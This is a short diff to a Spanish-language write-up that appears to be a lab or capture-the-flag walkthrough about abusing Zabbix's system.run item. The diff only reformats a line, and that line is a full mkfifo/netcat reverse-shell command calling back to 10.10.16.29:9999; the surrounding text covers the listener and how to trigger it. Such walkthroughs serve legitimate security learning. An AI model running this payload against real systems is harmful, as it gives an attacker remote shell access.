@@ -339,7 +339,8 @@ En el boton Select elegimos de la lista desplegable la opción **`system.run`**,
 
 Tenemos dos posibles modos, **`wait`** y **`nowait`**, pero hay que tener en cuenta que la primera provoca que la conexión no sea estable,
 así que elegimos la segunda y nos quedará de esta forma nuestro comando:
-> system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.29 9999 >/tmp/f,nowait]
+
+system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.29 9999 >/tmp/f,nowait]
 
 Ahora nos ponemos en escucha con **`nc -nlvp 9999`** y finalmente le damos al botón **`Test`** y **`Get value`** para obtener nuestra shell:
 
